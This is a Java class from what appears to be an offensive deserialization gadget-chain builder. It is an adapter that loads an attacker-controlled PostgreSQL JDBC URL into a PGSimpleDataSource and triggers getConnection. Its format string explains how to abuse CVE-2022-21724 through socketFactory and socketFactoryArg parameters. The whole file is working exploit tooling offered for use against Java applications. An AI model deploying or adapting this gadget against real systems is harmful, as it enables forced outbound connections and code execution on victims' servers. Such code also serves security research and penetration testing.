package org.ses.gadgetbuilder.impl.adapters.getters;

import org.postgresql.ds.PGSimpleDataSource;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;

import javax.sql.DataSource;

/**
 * https://blog.pyn3rd.com/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/
 */
@Authors(Authors.PYN3RD)
@Impact(Impact.DBConnection)
@Dependencies("org.postgresql.postgresql:42.2.24")
public class PostgresqlMethodInvokeAdapter extends GetterMethodInvokeAdapter {
    @Override
    public Object getInvocationTarget(String command) throws Exception {
        if (!command.startsWith("jdbc:postgresql://"))
            command = "jdbc:postgresql://" +  command;

        PGSimpleDataSource dataSource = new PGSimpleDataSource();
        dataSource.setUrl(command);

        return dataSource;
    }

    @Override
    public String getMethodName() {
        return "getConnection";
    }

    @Override
    public String getCommandFormat() {
        return "<host>:<port>/<db>  OR check if vulnerable postgresql version (cve-2022-21724) for: <host>:<port>/<db>?socketFactory=<factory>&socketFactoryArg=<arg>";
    }

    @Override
    public Class<?> getTargetInterface() {
        return DataSource.class;
    }
}
